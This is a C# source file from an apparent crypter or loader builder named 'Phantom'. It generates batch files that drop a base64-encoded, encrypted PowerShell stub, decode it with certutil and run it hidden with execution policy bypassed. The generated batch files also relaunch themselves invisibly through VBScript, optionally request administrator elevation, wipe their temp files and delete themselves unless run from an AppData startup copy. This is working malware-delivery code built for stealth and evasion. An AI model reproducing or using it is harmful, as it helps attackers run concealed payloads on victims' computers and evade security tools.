using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Phantom
{
    internal class FileGen
    {
        internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, PhantomMain.FileType fileType, Random rng)
        {
            // Generate PowerShell script
            string psScript = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();

            output.AppendLine("@echo off");
            output.AppendLine("setlocal enableextensions");

            string relaunchVbs = null;
            string psVbs = null;
            string magicFlag = null;
            if (hidden)
            {
                magicFlag = "_" + Utils.RandomString(3, rng) + "_";
                relaunchVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                psVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                output.AppendLine($"if \"%1\"==\"{magicFlag}\" goto main");
                output.AppendLine($"echo CreateObject(\"Shell.Application\").ShellExecute \"cmd.exe\", \"/c \"\"%~f0\"\" {magicFlag} %*\", \"\", \"open\", 0 > {relaunchVbs}");
                output.AppendLine($"wscript //B {relaunchVbs} >nul 2>&1");
                output.AppendLine("exit /b");
                output.AppendLine(":main");
            }

            // Admin elevation prompt
            if (runas)
            {
                string elevateFile = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                output.AppendLine(">nul 2>&1 net session || goto elevate");
                output.AppendLine("goto elevate_done");
                output.AppendLine(":elevate");
                output.AppendLine($"echo Set s = CreateObject(\"Shell.Application\") > {elevateFile}");
                output.AppendLine($"echo s.ShellExecute \"%~f0\", \"%*\", \"\", \"runas\", 0 >> {elevateFile}");
                output.AppendLine($"cscript //nologo {elevateFile}");
                output.AppendLine($"del {elevateFile} >nul 2>&1");
                output.AppendLine("exit /b");
                output.AppendLine(":elevate_done");
            }

            // Random temp filename for decoded ps1
            string tmpName = Utils.RandomString(8, rng);
            string tmpB64 = Utils.RandomString(8, rng);
            string b64File = $"%TEMP%\\{tmpB64}.b64";
            string ps1File = $"%TEMP%\\{tmpName}.ps1";

            // Write base64-encoded PS script to a temp .b64 file via echo
            byte[] psBytes = Encoding.UTF8.GetBytes(psScript);
            string b64 = Convert.ToBase64String(psBytes);

            // Split base64 into 60-char lines for echo
            List<string> b64Lines = new List<string>();
            for (int i = 0; i < b64.Length; i += 60)
            {
                int len = Math.Min(60, b64.Length - i);
                b64Lines.Add(b64.Substring(i, len));
            }

            // First echo creates file, rest append
            for (int i = 0; i < b64Lines.Count; i++)
            {
                if (i == 0)
                    output.AppendLine($"echo {b64Lines[i]} > {b64File}");
                else
                    output.AppendLine($"echo {b64Lines[i]} >> {b64File}");
            }

            // certutil decode, then run
            output.AppendLine($"certutil -decode {b64File} {ps1File} >nul 2>&1");

            string psPath;
            if (fileType == PhantomMain.FileType.NET64 || fileType == PhantomMain.FileType.x64)
                psPath = "%systemdrive%\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            else
                psPath = "%systemdrive%\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

            if (hidden)
            {
                string qq = "\"\"";
                output.AppendLine($"set \"_b=%~f0\"");
                output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {psVbs}");
                output.AppendLine($"echo s.Run \"{psPath} -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File {qq}{ps1File}{qq} {qq}%_b%{qq} %*\", 0, True >> {psVbs}");
                output.AppendLine($"wscript //B {psVbs} >nul 2>&1");
            }
            else
            {
                output.AppendLine($"{psPath} -NoProfile -ExecutionPolicy Bypass -File {ps1File} \"%~f0\" %*");
            }

            // Cleanup temp files
            output.AppendLine($"del {b64File} >nul 2>&1");
            output.AppendLine($"del {ps1File} >nul 2>&1");
            if (relaunchVbs != null)
                output.AppendLine($"del {relaunchVbs} >nul 2>&1");
            if (psVbs != null)
                output.AppendLine($"del {psVbs} >nul 2>&1");

            // Self-delete (skips startup copies in AppData)
            if (selfdelete)
            {
                output.AppendLine("set \"_p=%~dp0\"");
                output.AppendLine("if /i \"%_p:AppData=%\"==\"%_p%\" ((goto) 2>nul & del \"%~f0\")");
            }

            output.AppendLine("exit /b");

            return output.ToString();
        }
    }
}
